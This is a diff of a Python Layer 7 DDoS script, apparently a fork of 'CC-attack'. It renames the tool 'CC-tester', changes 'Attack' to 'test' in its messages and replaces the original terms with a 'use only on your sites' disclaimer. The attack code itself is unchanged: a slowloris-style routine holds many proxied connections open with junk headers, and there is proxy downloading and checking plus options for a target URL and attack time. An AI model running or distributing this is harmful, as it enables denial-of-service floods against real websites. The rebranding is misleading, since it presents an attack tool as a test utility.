@@ -19,23 +19,20 @@ import os
 
 print ('''
 	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
-	 CC/      CC/       |-----------|/ 
-	 CC/      CC/       |  Layer 7  |/ 
-	 CC/////  CC/////   | ddos tool |/ 
+	  CCCCC/   CCCCC/   | CC-tester |/
+	 CC/      CC/       |-----------|/
+	 CC/      CC/       |  Layer 7  |/
+	 CC/////  CC/////   | test tool |/
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
 Version 3.7.1 (2022/3/24)
-                              C0d3d by L330n123
+                              Coded by L330n123
+                              Modified by bloodsbro
 ┌─────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website       │
+│       Tos: Do not use for bad purposes      │
+│      Use only on your sites for testing     │
 ├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Added Http Proxy Support       │
-│          [+] Optimization                   │
-│          [+] Changed Varible Name           │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/Leeon123/CC-attack │
+│ Link: https://github.com/Leeon123/CC-tester │
 └─────────────────────────────────────────────┘''')
 
 acceptall = [
@@ -373,26 +370,26 @@ def slow(conn,proxy_type):
 	for _ in range(conn):
 		threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
 	while True:
-		sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+		sys.stdout.write("[*] Running Slow test || Connections: "+str(len(socket_list))+"\r")
 		sys.stdout.flush()
 		if len(socket_list) != 0 :
 			for s in list(socket_list):
 				try:
 					s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
-					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+					sys.stdout.write("[*] Running Slow test || Connections: "+str(len(socket_list))+"\r")
 					sys.stdout.flush()
 				except:
 					s.close()
 					socket_list.remove(s)
-					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+					sys.stdout.write("[*] Running Slow test || Connections: "+str(len(socket_list))+"\r")
 					sys.stdout.flush()
 			proxy = Choice(proxies).strip().split(":")
 			for _ in range(conn - len(socket_list)):
 				threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
 		else:
 			time.sleep(0.1)
-'''		
-		
+'''
+
 nums = 0
 def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
 	global nums
@@ -575,7 +572,7 @@ def DownloadProxies(proxy_ver):
 	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
-	print('''===============  CC-attack help list  ===============
+	print('''===============  CC-tester help list  ===============
    -h/help   | showing this message
    -url      | set target url
    -m/mode   | set program mode
@@ -587,7 +584,7 @@ def PrintHelp():
    -f        | set proxies file (default:proxy.txt)
    -b        | enable/disable brute mode
              | Enable=1 Disable=0  (default:0)
-   -s        | set attack time(default:60)
+   -s        | set test time(default:60)
    -down     | download proxies
    -check    | check proxies
 =====================================================''')
